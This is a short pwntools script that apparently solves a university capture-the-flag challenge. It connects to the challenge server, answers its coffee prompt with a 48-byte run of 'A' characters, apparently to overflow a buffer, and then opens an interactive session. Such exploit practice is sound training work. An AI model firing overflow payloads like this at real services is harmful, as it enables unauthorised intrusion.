from pwn import *

p = remote('cyberchallenge.disi.unitn.it', 9000)
p.recvuntil('Please pour me some coffee:') 

p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.interactive()